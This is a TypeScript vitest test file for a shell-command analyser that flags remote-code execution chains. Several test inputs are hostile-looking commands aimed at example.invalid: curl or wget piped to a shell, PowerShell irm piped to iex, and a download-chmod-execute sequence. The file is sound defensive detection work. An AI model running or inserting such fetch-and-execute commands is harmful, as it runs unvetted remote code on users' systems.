import { describe, expect, it } from "vitest";
import { analyseShellCommand } from "./analyse.js";

const loc = { filePath: "setup.js", startLine: 1, endLine: 1 };

describe("analyseShellCommand", () => {
  it("detects curl piped to bash as REMOTE_CONTENT_TO_SHELL", () => {
    const result = analyseShellCommand({
      command: "curl -fsSL https://example.invalid/install | bash",
      sourceLocation: loc,
      executionSink: "child_process.execSync",
    });
    expect(result.operations.map((o) => o.kind)).toEqual([
      "REMOTE_DOWNLOAD",
      "SHELL_INTERPRETER",
    ]);
    expect(result.chainHints).toHaveLength(1);
    expect(result.chainHints[0]?.type).toBe("REMOTE_CONTENT_TO_SHELL");
    expect(result.findings.some((f) => f.category === "REMOTE_CODE_FETCH")).toBe(true);
  });

  it("detects wget | sh", () => {
    const result = analyseShellCommand({
      command: "wget -qO- https://example.invalid/x | sh",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    expect(result.chainHints[0]?.type).toBe("REMOTE_CONTENT_TO_SHELL");
  });

  it("detects PowerShell irm | iex", () => {
    const result = analyseShellCommand({
      command: "irm https://example.invalid/payload | iex",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    expect(result.operations[0]?.kind).toBe("REMOTE_DOWNLOAD");
    expect(result.operations[1]?.kind).toBe("SHELL_INTERPRETER");
    expect(result.chainHints[0]?.type).toBe("REMOTE_CONTENT_TO_SHELL");
  });

  it("detects download write chmod execute", () => {
    const result = analyseShellCommand({
      command:
        "curl -o /tmp/a https://example.invalid/a && chmod +x /tmp/a && /tmp/a",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    expect(result.chainHints.some((h) => h.type === "DOWNLOAD_WRITE_EXECUTE")).toBe(
      true,
    );
  });

  it("does not treat curl --version as a remote download chain", () => {
    const result = analyseShellCommand({
      command: "curl --version",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    expect(result.chainHints).toHaveLength(0);
    expect(result.operations[0]?.kind).toBe("UNKNOWN");
  });

  it("does not invent a chain from co-occurring unused curl text", () => {
    // Only the executed command is analysed; unused strings are never passed in.
    const result = analyseShellCommand({
      command: "echo hello",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    expect(result.chainHints).toHaveLength(0);
    expect(result.operations).toHaveLength(0);
  });

  it("never expands command substitution", () => {
    const result = analyseShellCommand({
      command: "echo $(curl https://example.invalid)",
      sourceLocation: loc,
      executionSink: "execSync",
    });
    // Substitution stays opaque; we must not claim a download→shell chain.
    expect(result.chainHints).toHaveLength(0);
  });
});
